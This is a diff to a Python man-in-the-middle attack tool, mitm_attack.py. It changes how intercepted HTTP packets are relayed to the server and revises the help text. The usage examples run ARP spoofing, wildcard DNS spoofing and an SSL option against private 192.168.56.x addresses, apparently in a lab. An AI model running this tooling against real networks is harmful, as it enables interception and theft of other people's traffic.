@@ -253,8 +253,9 @@ class MitMAttack:
             :param p: packet
             :return:
             """
+            print(p.show())
             # make connection with the server
-            a = TCP_client.tcplink(HTTP, p[TCP].dst, p[TCP].dport)
+            a = TCP_client.tcplink(HTTP, p[IP].dst, p[TCP].dport)
 
             # send the request to the server
             request = HTTP() / p[HTTPRequest]
@@ -284,12 +285,14 @@ if __name__ == '__main__':
                       formatter_class=argparse.RawDescriptionHelpFormatter,
                       epilog='''Example usages:
     mitm_attack.py -targets 192.168.56.101 192.168.56.102 -arp -dns 0 1 -dns_q "*" -dns_ip 192.168.56.103 
-    mitm_attack.py -targets_file "targets_ip.txt" -dns 0 -dns_q "*" -dns_ip 192.168.56.103 -ssl 0''')
+    mitm_attack.py -targets_file targets_ip.txt -arp -dns 0 -dns_q "*" -dns_ip 192.168.56.103 -ssl 0''')
 
     target_group = parser.add_mutually_exclusive_group(required=True)
-    target_group.add_argument('-targets', type=str, nargs='*', help='The ip addresses of the targets')
+    target_group.add_argument('-targets', type=str, nargs='*',
+                              help='The ip addresses of the targets; either targets or targets_file must be given')
     target_group.add_argument('-targets_file', type=str,
-                              help='The name of a file with the ip addresses of the targets on seperate lines')
+                              help='The name of a file with the ip addresses of the targets on separate lines;'
+                                   ' either targets or targets_file must be given')
 
     parser.add_argument('-Ninf', '--network_interface', type=str,
                         help='The network interface to operate on, if not set will be asked dynamically')
